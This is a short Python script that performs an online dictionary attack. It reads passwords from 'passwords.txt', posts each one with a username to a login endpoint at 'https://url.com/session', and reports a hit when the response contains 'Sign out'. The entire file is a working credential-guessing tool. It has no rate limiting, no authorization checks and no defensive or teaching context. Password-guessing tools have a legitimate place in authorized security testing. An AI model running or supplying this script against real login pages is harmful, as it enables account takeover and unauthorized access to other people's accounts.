import requests

def main():
    # Open passwords file
    with open("passwords.txt", "r") as fd:
        wordlist = fd.read()

    # Split passwords by newline character
    passwords = wordlist.split("\n")

    # URL for url login
    url = "https://url.com/session"

    
    username = ""

    # Loop through passwords and try to login
    for password in passwords:
        # Prepare data for login request
        data = {
            "login": username,
            "password": password,
            "commit": "Sign in",
        }

        # Send login request
        r = requests.post(url, data=data)

        # Check if login was successful
        if "Sign out" in r.text:
            print("Password found for the user {} is: {}".format(username, password))
            break
        else:
            print("Incorrect password: {}".format(password))

if __name__ == "__main__":
    main()
